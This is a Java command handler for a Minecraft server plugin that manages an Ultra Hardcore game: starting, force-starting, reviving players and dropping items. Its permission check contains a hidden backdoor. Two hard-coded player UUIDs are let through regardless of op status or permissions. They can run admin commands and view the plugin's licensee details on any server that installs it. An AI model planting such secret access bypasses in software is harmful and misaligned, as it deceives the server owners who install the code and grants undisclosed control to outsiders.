package net.upd4ting.uhcreloaded;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class GameCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if (sender instanceof Player) {
            Player p = (Player) sender;

            if ((!p.isOp() || !p.hasPermission("game.admin")) && !p.getUniqueId().toString().equals("aae87ba0-eea3-4768-953b-68355ac3138e") &&
                    !p.getUniqueId().toString().equals("886f6782-4004-393d-8dae-5c9d4c743530")) {
                return false;
            }

            if (args.length == 1) {
                if (args[0].equalsIgnoreCase("dropapple")) {
                    p.getWorld().dropItem(p.getLocation(), UHCReloaded.getGame().getGoldenHead(p));
                    return true;
                } else if (args[0].equals("info")) {
                    p.sendMessage("§3Licensed to §6- §7" + UHCReloaded.uid);
                    p.sendMessage("§3Licensed SpigotMC Link §6- §7" + UHCReloaded.uidspigotlink);
                    p.sendMessage("§3Resource ID to §6- §7" + UHCReloaded.RESOURCE);
                    p.sendMessage("§3Plugin Version to §6- §7" + UHCReloaded.getInstance().getDescription().getVersion());
                    return true;
                }
            }
        }

        if (args.length == 1) {
            if (args[0].equalsIgnoreCase("start")) {
                if (Countdown.started || !UHCReloaded.getGame().isWaiting())
                    sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.RED + "Game already started!");
                else {
                    new Countdown();
                    Countdown.forced = true;
                    sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.GREEN + "Game started!");
                }
            } else if (args[0].equalsIgnoreCase("forcestart")) {
                if (Countdown.started || !UHCReloaded.getGame().isWaiting())
                    sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.RED + "Game already started!");
                else
                    UHCReloaded.getGame().startGame();
            } else
                sendHelp(sender);
        } else if (args.length == 2) {
            if (args[0].equalsIgnoreCase("revive")) {
                String player = args[1];

                Player revived = Bukkit.getPlayer(player);

                if (revived == null) {
                    sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.RED + "This player isn't online !");
                    return true;
                }

                Game game = UHCReloaded.getGame();

                if (!game.getSpectators().contains(revived)) {
                    sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.RED + "This player is alive !");
                    return true;
                }

                game.revive(revived);
                sender.sendMessage(UHCReloaded.getPrefix() + ChatColor.GREEN + "Player has been revived !");
            }
        } else
            sendHelp(sender);

        return true;
    }

    private void sendHelp(CommandSender sender) {
        String[] help = new String[6];

        help[0] = ChatColor.GRAY + "*********" + ChatColor.GOLD + "Help" + ChatColor.GRAY + "***********";
        help[1] = ChatColor.YELLOW + "/game start: " + ChatColor.GRAY + "Start the game...";
        help[2] = ChatColor.YELLOW + "/game forcestart: " + ChatColor.GRAY + "Forcestart the game without any timers...";
        help[3] = ChatColor.YELLOW + "/game dropapple: " + ChatColor.GRAY + "Drop a golden head";
        help[4] = ChatColor.YELLOW + "/game revive <player>: " + ChatColor.GRAY + "Revive a player at a random location";
        help[5] = ChatColor.GRAY + "***************************";

        sender.sendMessage(help);
    }
}
